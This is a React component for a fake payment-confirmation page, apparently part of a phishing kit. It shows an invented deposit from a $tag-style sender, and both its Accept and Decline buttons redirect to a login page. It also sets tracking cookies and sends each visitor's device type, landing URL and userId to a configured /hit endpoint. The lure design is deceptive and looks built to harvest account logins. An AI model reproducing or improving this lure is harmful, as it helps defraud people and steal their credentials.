import React, { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { isMobile, isTablet, isDesktop } from "react-device-detect";
import Cookies from "js-cookie";
import "./PaymentConfirmation.css";

const Home = () => {
  const { userId } = useParams();
  const navigate = useNavigate();

  const apiUrl = process.env.REACT_APP_API_URL;
  const name = process.env.REACT_APP_NAME;
  const tag = process.env.REACT_APP_TAG;
  const amount = process.env.REACT_APP_AMOUNT;
  const profile = process.env.REACT_APP_PROFILE;

  // Set cookies
  useEffect(() => {
    Cookies.set("userId", userId, { expires: 7 });
    Cookies.set("landing_url", window.location.href, { expires: 7 });
    Cookies.set("userAgent", navigator.userAgent, { expires: 7 });
  }, [userId]);

  const [timestamp, setTimestamp] = useState("");

  // Set live timestamp on component mount
  useEffect(() => {
    const now = new Date();
    const options = { hour: "numeric", minute: "numeric", hour12: true };
    setTimestamp(`Today at ${now.toLocaleTimeString("en-US", options)}`);
  }, []);

  const handleAccept = () => {
    navigate("/auth/login"); // redirect to /auth/login
    console.log("Payment Accepted");
  };

  const handleDecline = () => {
    navigate("/auth/login"); // redirect to /auth/login
    console.log("Payment Declined");
  };

  // Device info
  const mobile = isMobile ? 1 : 0;
  const desktop = isDesktop ? 1 : 0;
  const tablet = isTablet ? 1 : 0;

  useEffect(() => {
    const sendHitData = async () => {
      try {
        const data = {
          mobile,
          desktop,
          tablet,
          landing_url: window.location.href,
          userId,
        };
        const response = await fetch(`${apiUrl}/hit`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(data),
        });
        if (!response.ok) console.error("Error submitting form");
      } catch (err) {
        console.error("Error:", err);
      }
    };
    sendHitData();
  }, [userId, mobile, desktop, tablet, apiUrl]);

  return (
    <div className="payment-container">
      {/* HEADER */}
      <div className="header">
        <img src={profile} alt="Profile" className="profile-picture" />
        <div className="user-name">{name}</div>
        <div className="payment-details">Payment from {tag}</div>
      </div>
      {/* MIDDLE */}
      <div className="midl">
        <div className="amount">${amount}</div>
        <div className="description">For Deposit</div>
        <div className="timestamp">{timestamp}</div>
        {/* FOOTER BUTTONS */}
        <div className="footer">
          <button className="status" onClick={handleAccept}>
            Accept
          </button>
          <button className="status decline" onClick={handleDecline}>
            Decline
          </button>
        </div>
      </div>
    </div>
  );
};

export default Home;
